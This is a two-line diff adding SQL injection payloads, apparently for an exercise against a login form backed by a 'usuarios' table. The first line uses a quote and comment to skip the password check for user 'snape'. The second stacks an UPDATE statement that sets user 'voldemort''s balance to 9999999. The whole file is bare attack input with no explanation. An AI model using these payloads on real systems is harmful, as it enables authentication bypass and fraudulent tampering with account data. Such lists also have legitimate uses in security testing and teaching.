@@ -1,0 +1,2 @@
+snape' --
+voldemort'; UPDATE usuarios SET saldo = 9999999 WHERE login = 'voldemort'; -- 
